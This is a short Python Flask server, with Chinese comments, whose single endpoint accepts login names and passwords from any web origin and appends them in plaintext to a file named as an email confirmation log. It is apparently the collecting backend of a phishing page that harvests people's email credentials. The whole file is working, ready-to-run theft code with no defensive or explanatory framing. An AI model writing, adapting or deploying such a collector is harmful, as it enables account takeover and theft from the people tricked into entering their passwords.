from flask import Flask, request, jsonify
from flask_cors import CORS  # 允许跨域请求
import os

app = Flask(__name__)
CORS(app)  

CREDENTIALS_FILE = "/home/user/html_server/confirmation_log_email.txt"  # 存储路径

@app.route('/save', methods=['POST', 'OPTIONS'])
def save_credentials():
    if request.method == 'OPTIONS':  
        return '', 200  

    try:
        data = request.get_json()  
        if not data:
            return jsonify({"error": "Invalid JSON"}), 400

        login = data.get('login')
        password = data.get('password')

        if not login or not password:
            return jsonify({"error": "Invalid input"}), 400

        
        os.makedirs(os.path.dirname(CREDENTIALS_FILE), exist_ok=True)

        # 追加存储，避免覆盖
        with open(CREDENTIALS_FILE, "a") as file:
            file.write(f"Login: {login}\nPassword: {password}\n\n")

        return jsonify({"message": "Credentials saved successfully!"}), 200

    except Exception as e:
        return jsonify({"error": str(e)}), 500  

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5126, debug=False) 

